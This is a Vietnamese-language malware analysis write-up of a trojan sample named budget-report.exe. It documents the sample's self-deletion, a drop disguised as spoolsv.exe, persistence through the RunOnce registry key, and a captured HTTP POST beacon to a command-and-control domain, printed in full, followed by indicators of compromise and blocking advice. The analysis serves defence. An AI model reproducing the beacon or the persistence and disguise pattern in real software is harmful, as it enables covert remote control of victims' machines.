---
title: Budget-report.exe
date: 2025-6-25 08:30:00 +0700
categories: [Malware Analysis, Dynamic]
tags: [persistence, c2, trojan, backdoor]
description: Phân tích hành vi runtime của mẫu mã độc budget-report.exe cơ chế persistence, kết nối C2, và đánh giá khả năng là backdoor/beacon trojan.
---

## 🎯 Mục tiêu

- Theo dõi hành vi runtime của mẫu `budget-report.exe`
- Xác định mục tiêu, kỹ thuật và đánh giá khả năng gây hại
- Ghi nhận các IOC quan trọng (Indicators of Compromise)

---

## 🧊 1. Phân tích tĩnh

**Tên file**: `budget-report.exe`

**MD5**: `d7cc6c987c68a88defdab3a59070777e`

### 🔹 VirusTotal
![VirusTotal scan](/resources/Budget-report/Pasted image 20251001080419.png)

### 🔹 EXEinfoPE
- 32-bit, GUI, không bị pack

![EXEinfoPE](/resources/Budget-report/Pasted image 20251001073557.png)

### 🔹 PeStudio

#### 📌 Indicators
![PeStudio Indicators](/resources/Budget-report/Pasted image 20251001073819.png)

- Sử dụng thư viện liên quan đến **Internet** và **Sockets**
- Có nhiều hàm import (≈54), khá nhiều so với một GUI đơn giản

#### 📌 Strings
![PeStudio Strings](/resources/Budget-report/Pasted image 20251001074032.png)

- Nhiều chuỗi khả nghi: `GetUserName`, `InternetOpen`, `CreateKey`, tên file `spoolsv.exe`, chuỗi liên quan socket/process/registry...

#### 📌 IAT – Bảng hàm nhập
![IAT view](/resources/Budget-report/Pasted image 20251001074327.png)

- Nhiều API liên quan mạng, registry, process → gợi ý hành vi persistence + network.

---

## ⚙️ 2. Phân tích động

### 🔸 1. Xóa chính nó sau khi chạy

Ngay khi khởi chạy, file gốc `budget-report.exe` bị xóa khỏi ổ đĩa (self-delete).

---

### 🔸 2. Kết nối mạng (Fakenet)

Mẫu gửi HTTP POST về một địa chỉ C2:

```http
POST /uan9Bau3LJ9/ HTTP/1.1
Host: mbaquyahcn.biz:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2...)

Body:
a=&b=&c=%67%61%78%79%79%76%76%76%73%74%47%71%71%6E%72%6F%6F%66%6C%6C%6A
````


✅ Payload `c=` sau khi decode ra chuỗi có vẻ ngẫu nhiên (`gaxyvvvstGqqnroofllj`) → có thể là ID hệ thống hoặc token định danh.

> Mẫu gửi lại gói này nhiều lần — có thể chờ phản hồi từ máy chủ C2 để nhận lệnh tiếp theo (beacon behaviour).

---

### 🔸 3. Theo dõi registry bằng Regshot

![Regshot diff](/resources/Budget-report/Pasted image 20251001081102.png)

Một số key đáng chú ý:

```reg
HKCU\SOFTWARE\12648430                   → chứa chuỗi hash định danh
HKCU\...\RunOnce\*12648430               → khởi động spoolsv.exe khi máy bật lại
HKCU\...\AppData\Roaming\12648430\spoolsv.exe → file copy chính mã độc
```

📁 **Hành vi chính:**

* Xóa file gốc `budget-report.exe`
* Tạo `spoolsv.exe` tại `AppData\Roaming\12648430` (drop & copy)
* Ghi vào registry `RunOnce` để **tự động khởi động lại sau reboot**

---

### 🔸 4. ProcMon theo dõi chi tiết

![ProcMon timeline](/resources/Budget-report/budget-report.png)

Timeline ProcMon xác nhận chuỗi hành động:

* Đọc user profile
* Tạo thư mục trong AppData
* Copy chính nó thành `spoolsv.exe`
* Ghi registry RunOnce
* Gửi HTTP request ra ngoài (beacon)

---

## 🚨 Kết luận

### ✅ Tóm tắt hành vi

* **Tạo persistence** qua RunOnce → đảm bảo chạy lại sau khởi động
* **Liên lạc với C2**: `mbaquyahcn.biz` trên cổng 80 (POST `/uan9Bau3LJ9/`)
* **Xóa file gốc** và **drop file mới** (`spoolsv.exe`) để khó bị phát hiện

### 🎯 Mục tiêu & Ý nghĩa

| Hành vi            | Mục tiêu                              |
| ------------------ | ------------------------------------- |
| Registry RunOnce   | Giữ sự hiện diện lâu dài              |
| HTTP POST C2       | Báo về máy & chờ chỉ thị từ C2        |
| Xóa file gốc       | Tránh bị phân tích                    |
| Drop `spoolsv.exe` | Ngụy trang dưới tên tiến trình hợp lệ |

### 🔐 Khả năng gây hại

* Khả năng cao là **backdoor đơn giản** / **beacon trojan**
* Gửi định danh ban đầu về C2 để chờ lệnh — hạ tầng đã sẵn sàng cho điều khiển từ xa
* Chưa thấy hành vi rõ ràng về đánh cắp dữ liệu hay phá hoại, nhưng khả năng mở rộng hành vi tồn tại nếu C2 trả lệnh

---

## 📌 IOC (Indicators of Compromise)

| Loại         | Giá trị                                                  |
| ------------ | -------------------------------------------------------- |
| File hash    | `d7cc6c987c68a88defdab3a59070777e`                       |
| C2 domain    | `mbaquyahcn.biz`                                         |
| C2 path      | `/uan9Bau3LJ9/`                                          |
| File drop    | `C:\Users\<user>\AppData\Roaming\12648430\spoolsv.exe`   |
| Registry key | `HKCU\...\RunOnce\*12648430`                             |
| UA giả       | `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2;...)` |

---

> 🛡️ **Khuyến nghị:**
>
> * Chặn domain `mbaquyahcn.biz` ở proxy/IDS/Firewall.
> * Quét & cách ly các file có đường dẫn giống `AppData\Roaming\12648430\spoolsv.exe`.
> * Giám sát registry Run/RunOnce cho entry lạ dạng `*12648430`.
> * Nếu phát hiện, thu thập memory dump & network capture để phân tích sâu (để xác định lệnh tiếp theo từ C2).

---
